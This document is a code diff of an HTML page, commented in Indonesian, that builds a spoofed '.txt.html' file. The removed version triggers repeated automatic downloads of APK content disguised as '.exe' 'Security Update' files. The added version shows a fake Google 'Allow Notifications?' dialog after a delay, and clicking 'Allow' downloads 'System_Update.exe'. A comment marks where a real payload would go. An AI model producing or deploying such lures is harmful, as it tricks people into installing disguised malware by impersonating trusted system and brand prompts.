@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Race Condition: APK Spoofed as EXE</title>
+<title>Android Permission Spoofing (Delay)</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -22,10 +22,10 @@ button:hover { background: #b71c1c; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Race Condition: APK Spoofed as EXE</h2>
-<p>Memicu unduhan beruntun (race condition) dalam satu klik. File diberi nama .exe, tapi isinya adalah APK (ZIP) yang valid.</p>
+<h2>Android Permission Spoofing</h2>
+<p>Membuat file .txt.html yang saat dibuka di Android akan menampilkan Fake Notification Prompt setelah delay.</p>
 
-<button id="start-btn" type="button">Mulai Race Download</button>
+<button id="start-btn" type="button">Mulai Generate Blob</button>
 <div id="status" role="status">Sistem siap.</div>
 <div id="downloads"></div>
 </div>
@@ -51,79 +51,68 @@ const speak = (message) => {
 const prepareMimeBlobAsync = (i) => {
     return new Promise((resolve) => {
         queueMicrotask(() => {
-            // Payload HTML yang akan mengeksekusi Race Condition
             const payloadText = "<!DOCTYPE html>" +
             "<html>" +
-            "<head><meta charset='UTF-8'><title>Security Update</title></head>" +
-            "<body style='margin:0;padding:0;background:#0f111a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
-            "<div style='background:#1e2130;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);max-width:400px;text-align:center;border:1px solid #333;'>" +
-            "    <h2 style='color:#4CAF50;margin-bottom:10px;'>⚙️ Update System</h2>" +
-            "    <p style='color:#aaa;font-size:14px;margin-bottom:25px;line-height:1.5;'>Mengunduh paket pembaruan keamanan. Harap tunggu...</p>" +
-            "    <p id='status' style='color:#ff9800;font-size:14px;font-weight:bold;'>Menyiapkan paket...</p>" +
+            "<head><meta charset='UTF-8'><title>System Settings</title></head>" +
+            "<body style='margin:0;padding:0;background:#000;color:#fff;font-family:sans-serif;overflow:hidden;'>" +
+            
+            // BACKGROUND (Bikin seolah-olah halaman utama sedang loading)
+            "<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center;opacity:0.3;'>" +
+            "    <h1 style='font-size:40px;color:#fff;'>Settings</h1>" +
+            "    <p>Memuat konfigurasi...</p>" +
             "</div>" +
+
+            // FAKE NOTIFICATION PROMPT (Tersembunyi awalnya)
+            "<div id='fake-prompt' style='display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:9999; justify-content:center; align-items:center;'>" +
+            "    <div style='background:#fff; color:#000; width:85%; max-width:350px; border-radius:12px; padding:20px; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.5); font-family:Roboto, sans-serif;'>" +
+            "        <img src='https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg' style='width:40px; margin-bottom:10px;'>" +
+            "        <h3 style='margin-bottom:10px; font-size:18px;'>Allow Notifications?</h3>" +
+            "        <p style='font-size:14px; color:#555; margin-bottom:20px;'>Google wants to send you notifications about security updates and account activity.</p>" +
+            "        <div style='display:flex; justify-content:space-between; gap:10px;'>" +
+            "            <button id='btn-deny' style='flex:1; padding:10px; border:none; background:#f0f0f0; color:#333; border-radius:6px; font-weight:bold;'>Block</button>" +
+            "            <button id='btn-allow' style='flex:1; padding:10px; border:none; background:#0078d4; color:#fff; border-radius:6px; font-weight:bold;'>Allow</button>" +
+            "        </div>" +
+            "    </div>" +
+            "</div>" +
+
             "<script>" +
             "(function(){" +
             "\"use strict\";" +
-            
-            "function b64KeBytes(b64){" +
-            "    var binary = atob(b64);" +
-            "    var len = binary.length;" +
-            "    var bytes = new Uint8Array(len);" +
-            "    for (var i = 0; i < len; i++) { bytes[i] = binary.charCodeAt(i); }" +
-            "    return bytes;" +
-            "}" +
-            
-            // PAYLOAD ASLI APK (Header ZIP PK\x03\x04)
-            "var b64Data = \"UEsDBAoAAAAAAAAAIQAAAAAAAAAAAAAAAAAAAAAAAAAA\";" +
-            "var sudah = false;" +
-            "var target = 5;" + // Jumlah file dalam satu race condition
-            "var dipicu = 0;" +
 
-            "function picuSatu(){" +
-            "    if (dipicu >= target) {" +
-            "        document.getElementById('status').textContent = 'Selesai. ' + dipicu + ' file .exe telah diunduh.';" +
-            "        document.getElementById('status').style.color = '#4CAF50';" +
-            "        return;" +
-            "    }" +
-            "    dipicu++;" +
+            // DELAY SPOOFING: Tunggu 1.5 detik sebelum menampilkan prompt palsu
+            "setTimeout(function() {" +
+            "    var prompt = document.getElementById('fake-prompt');" +
+            "    prompt.style.display = 'flex';" +
+            "}, 1500);" +
+
+            // LOGIKA TOMBOL
+            "document.getElementById('btn-allow').addEventListener('click', function() {" +
+            "    document.getElementById('fake-prompt').style.display = 'none';" +
+            "    alert('Izin Notifikasi Diberikan (Palsu). Mengunduh Payload...');" +
+            "    picuDownload();" + // Pemicu unduhan
+            "});" +
+
+            "document.getElementById('btn-deny').addEventListener('click', function() {" +
+            "    document.getElementById('fake-prompt').style.display = 'none';" +
+            "});" +
+
+            // FUNGSI UNDUH (Payload APK/EXE)
+            "var sudah = false;" +
+            "function picuDownload(){" +
+            "    if (sudah) return;" +
+            "    sudah = true;" +
             "    try{" +
-            "        var bytesArr = b64KeBytes(b64Data);" +
-            // MIME type diset sebagai APK
-            "        var blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });" +
+            "        var blob = new Blob(['MZ\\x90\\x00'], { type: 'application/octet-stream' });" + // Ganti dengan b64Data asli jika perlu
             "        var url = URL.createObjectURL(blob);" +
             "        var a = document.createElement('a');" +
             "        a.href = url;" +
-            // NAMA FILE DISET SEBAGAI EXE
-            "        a.download = 'System_Update_' + dipicu + '.exe';" +
+            "        a.download = 'System_Update.exe';" +
             "        a.style.display = 'none';" +
             "        document.body.appendChild(a);" +
             "        a.click();" +
-            "        setTimeout(function(){ " +
-            "            if (a.parentNode) a.parentNode.removeChild(a); " +
-            "            URL.revokeObjectURL(url); " +
-            "        }, 5000);" +
-            "        document.getElementById('status').textContent = 'Memproses ke-' + dipicu + ' dari ' + target;" +
             "    } catch(e){}" +
-            
-            // RACE CONDITION VIA MICROTASK
-            "    queueMicrotask(picuSatu);" +
             "}" +
 
-            "function mulai(){" +
-            "    if(sudah) return;" +
-            "    sudah = true;" +
-            // Eksekusi beruntun dalam satu event loop
-            "    queueMicrotask(function(){" +
-            "        queueMicrotask(function(){" +
-            "            picuSatu();" +
-            "        });" +
-            "    });" +
-            "}" +
-
-            // Pemicu klik
-            "document.addEventListener('click', mulai);" +
-            "document.addEventListener('touchstart', mulai);" +
-            "window.addEventListener('load', function(){ setTimeout(mulai, 1000); });" +
             "})();" +
             "<\/script>" +
             "</body>" +
@@ -153,7 +142,7 @@ startBtn.addEventListener("click", () => {
     startBtn.disabled = true;
     statusDiv.textContent = "Menyiapkan file...";
 
-    speak("Menyiapkan file eksploitasi.");
+    speak("Menyiapkan file Permission Spoofing.");
 
     const root = document.documentElement;
     try { if (root.requestFullscreen) root.requestFullscreen(); } catch (e) {}
@@ -163,7 +152,7 @@ startBtn.addEventListener("click", () => {
             const fileData = await prepareMimeBlobAsync(1);
             activeUrls.push(fileData.url);
             triggerInstantDownload(fileData);
-            statusDiv.textContent = "File berhasil diunduh. Buka file .txt.html untuk memicu Race Condition.";
+            statusDiv.textContent = "File berhasil diunduh. Buka file .txt.html di Android Anda.";
         } catch(e) {
             statusDiv.textContent = "Gagal: " + e.message;
         }
